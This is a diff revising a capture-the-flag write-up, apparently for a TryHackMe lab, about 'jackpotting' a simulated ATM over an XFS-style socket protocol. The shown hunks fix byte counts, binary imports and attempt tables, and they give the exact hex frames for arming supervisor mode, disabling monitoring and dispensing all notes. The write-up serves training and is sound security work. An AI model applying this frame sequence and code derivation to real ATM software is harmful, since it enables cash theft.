@@ -129,9 +129,9 @@ The service hands you its own protocol documentation on connect. It is also hone
 the banner arrives **unprompted**, before you send anything.
 
 > **Gotcha #2 — read the banner frame first.** My first probe sent `GETINFO 0x0304` immediately and
-> got back… the banner. The reply was 453 bytes and hashed identical to the banner file. If you don't
+> got back… the banner. The reply payload was 453 bytes (455 on the wire) and hashed identical to the banner file. If you don't
 > consume the banner, your first reply is always the banner, and you will mis-read it as a response.
-> The frame is self-describing: `0x01C5` = 453 bytes.
+> The frame is self-describing: `0x01C5` = 453 bytes of payload.
 
 ### 2.4 Capabilities
 
@@ -262,14 +262,14 @@ The banner advertises `GETINFO: 0x01` and `EXECUTE: 0x02`, which implies a read/
 It isn't real:
 
 ```
-00 00000301 0000   ->  full 432-byte status, WFS_SUCCESS
-03 00000301 0000   ->  full 432-byte status, WFS_SUCCESS
-01 00000301 0000   ->  full 432-byte status, WFS_SUCCESS
+00 00000301 0000   ->  full 432-byte status payload, WFS_SUCCESS
+03 00000301 0000   ->  full 432-byte status payload, WFS_SUCCESS
+01 00000301 0000   ->  full 432-byte status payload, WFS_SUCCESS
 ```
 
 `0x00` and `0x03` are neither rejected nor noted. **Dispatch is by command id alone.** That is a
 useful architectural fact — any hypothetical front-end that filtered on the type byte could be
-bypassed with one byte — but in the end every frame in the winning chain used `0x02`, so this was a
+bypassed with one byte — but in the end every ARM/DISPENSE/SET_MONITOR frame in the winning chain used `0x02` (the final GET_FLAG used `0x01`), so this was a
 true-but-irrelevant observation. Good to know, not the exploit.
 
 ### 4.2 What the read commands will not tell you
@@ -308,8 +308,8 @@ jackpot: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV),
 0980b26d08683e96ffbe167fbbf878a098d20d7226b2dcdcd51a35de8a7365c6
 ```
 
-14,472 bytes. `.text` is **473 bytes**. It imports exactly `strlen`, `printf`, `fprintf`,
-`__libc_start_main` — no `socket`, no `connect`, no `send`. Whatever this thing does, it does not
+14,472 bytes. `.text` is **473 bytes**. It imports `strlen`, `__printf_chk`, `__fprintf_chk` and `__libc_start_main`
+(the fortified printf/fprintf variants) plus the stderr data object — no `socket`, no `connect`, no `send`. Whatever this thing does, it does not
 talk to the ATM. It is a calculator.
 
 ### 5.2 The algorithm
@@ -360,7 +360,7 @@ Verification against the real binary, eight vectors:
 
 Two design flaws are visible in the algorithm itself, before touching the network:
 
-1. **The "secret" is a pure function of a public, 6-digit, non-rotating value.** The input space is
+1. **The "secret" is a pure function of a public, 6-digit, low-entropy value that only changes on a reset.** The input space is
    10⁶ — every valid code is enumerable offline in seconds. There is no key, salt, timestamp or
    randomness anywhere in the routine.
 2. **Validation is length-only and digit-agnostic.** `ABCDEF` and `!@#$%^` are accepted by the tool.
@@ -377,7 +377,7 @@ lives in the bridge, and must be learned from the bridge.
 ### 6.1 The obvious attempt: JSON
 
 ARM is "supervisor activation". Every other payload on this service is JSON, so the first attempts
-were JSON. All four failed with a byte-identical error:
+were JSON. The first four failed with a byte-identical error:
 
 ```
 {"rc": "WFS_ERR_CDM_INVALIDCODE", "detail": "invalid activation code"}
@@ -418,7 +418,7 @@ Which makes the body the **code itself**, with no quotes, no braces:
 {"rc": "WFS_SUCCESS", "detail": "armed - supervisor mode"}
 ```
 
-The difference between failure and success was exactly two bytes:
+One more body failed first — the same digits wrapped in JSON quotes. The difference between failure and success was exactly two bytes:
 
 ```
 22 32 31 30 36 37 34 38 33 22    -> INVALIDCODE     (JSON string: "21067483")
@@ -520,12 +520,11 @@ And `armed` stays `true` the whole time, which is why re-arming looks like it sh
 
 | Attempt | Strategy | Result |
 | --- | --- | --- |
-| 1 | arm → dispense `0`, dispense `0` | 40 notes, then **lock + rollback** |
-| 2 | arm → 7 × dispense `0` | 40 notes, then **lock + rollback** |
-| 3 | arm → dispense `0`, dispense `10` | 40 notes, then **lock + rollback** |
-| 4 | arm → arm → dispense `0` | 40 notes, then **lock + rollback** |
+| 1 | arm → dispense `0`, dispense `10` | 40 notes, then **lock + rollback** |
+| 2 | arm → dispense `0`, dispense `0` | 40 notes, then **lock + rollback** |
+| 3 | arm → dispense `0`, re-arm, dispense `0` | 40 notes, then **lock + rollback** |
 
-Four strategies, four rollbacks, `$0` net. The box is deliberately built so that brute repetition
+Three strategies, three rollbacks, `$0` net. The box is deliberately built so that brute repetition
 cannot win — every failed attempt resets you to 280 notes and a new nonce.
 
 ---
@@ -562,7 +561,7 @@ gives you the correct ordering: **ARM first, then SET_MONITOR**.
 
 ### 8.3 The decisive frame
 
-Send the dispenser that had failed three times before, byte-identical, twice:
+Send the frame that had failed twice before, byte-identical, twice — the dispense operation itself had failed three times overall:
 
 ```
 02 00000401 0001 30   -> {"rc":"WFS_SUCCESS","notes":40,"value":4000,"remaining_notes":240}
@@ -618,8 +617,10 @@ The seventh reply announces the state change:
 `0x301` now reports:
 
 ```json
-{"flag_released": true, "screen": "VAULT EMPTY", "dispensed_total": 280,
- "remaining_notes": 0}
+{"rc": "WFS_SUCCESS",
+ "status": {"nonce": "429097", "armed": true, "monitor_on": false, "locked": false,
+            "lock_remaining": 0, "screen": "VAULT EMPTY", "dispensed_total": 280,
+            "remaining_notes": 0, "vault_total_notes": 280, "flag_released": true}}
 ```
 
 And GET_FLAG:
@@ -635,6 +636,9 @@ And GET_FLAG:
 ```json
 {"rc": "WFS_SUCCESS", "flag": "THM{n0_card_……………….._XFS}"}
 ```
+
+> **Redaction note:** the flag is truncated in this published copy by choice. The raw reply artifact
+> (sha256 quoted in §10) contains the full string; the truncation is presentation only.
 
 The frame is 88 bytes: `0x0056` (=86) declared length, 86 bytes of payload, nothing trailing.
 
@@ -757,7 +761,7 @@ No framework, no exploit tooling. The whole box is a socket and some arithmetic.
 ### 12.2 The four frames that matter
 
 ```
-ARM         02 000004f0 0008 3231303637343833   # "21067483"
+ARM         02 000004f0 0008 3039323233313437   # "09223147" (winning run, nonce 429097)
 SET_MONITOR 02 000004f1 0001 30                 # "0"  (disable)
 DISPENSE    02 00000401 0001 30                 # "0"  (max, 40 notes)
 GET_FLAG    01 000004ff 0000
